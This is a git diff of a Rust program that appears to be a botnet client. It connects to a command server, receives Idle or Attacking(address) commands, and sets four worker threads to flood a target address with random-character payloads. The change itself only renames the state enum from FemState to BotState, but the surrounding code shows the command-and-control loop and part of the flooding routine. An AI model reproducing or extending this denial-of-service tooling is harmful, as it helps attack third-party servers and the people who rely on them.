@@ -1,6 +1,6 @@
 use std::{env, io::{Read, Write}, net::TcpStream, process, sync::{Arc, RwLock}, thread::{self, sleep}, time::Duration};
 
-use astolfo::FemState;
+use astolfo::BotState;
 use rand::Rng;
 
 fn main() {
@@ -14,8 +14,8 @@ fn main() {
 
     println!("[\x1b[92mSUCC\x1b[0m] Connection established to server");
 
-    let mut prev_state = FemState::Idle;
-    let working_state = Arc::new(RwLock::new(FemState::Idle));
+    let mut prev_state = BotState::Idle;
+    let working_state = Arc::new(RwLock::new(BotState::Idle));
 
     for _ in 0..4 {
         let thread_state = Arc::clone(&working_state);
@@ -25,10 +25,10 @@ fn main() {
             loop {
                 let state = thread_state.read().unwrap(); 
                 match &*state {
-                    FemState::Idle => {
+                    BotState::Idle => {
                         sleep(Duration::from_secs(3));
                     },
-                    FemState::Attacking(addr) => {
+                    BotState::Attacking(addr) => {
                         let mut payload = String::with_capacity(addr.len()+100);
                         for _ in 1..100 {
                             let c = rng.random_range(3..=126) as u8 as char;
@@ -74,22 +74,22 @@ fn main() {
             process::exit(1);
         });
 
-        let cmd = bincode::decode_from_slice::<FemState, _>(state.as_slice(), config);
+        let cmd = bincode::decode_from_slice::<BotState, _>(state.as_slice(), config);
 
         match cmd {
             Ok((cmd, _)) => {
                 if cmd != prev_state {
                     match cmd {
-                        FemState::Idle => {
+                        BotState::Idle => {
                             let mut write_guard = working_state.write().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
-                            *write_guard = FemState::Idle;
-                            prev_state = FemState::Idle;
+                            *write_guard = BotState::Idle;
+                            prev_state = BotState::Idle;
                             println!("[\x1b[94mINFO\x1b[0m] Set workers to idle");
                         },
-                        FemState::Attacking(addr) => {
+                        BotState::Attacking(addr) => {
                             let mut write_guard = working_state.write().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
-                            *write_guard = FemState::Attacking(addr.clone());
-                            prev_state = FemState::Attacking(addr);
+                            *write_guard = BotState::Attacking(addr.clone());
+                            prev_state = BotState::Attacking(addr);
                             println!("[\x1b[94mINFO\x1b[0m] Set workers to attack");
                         },
                         _ => {}
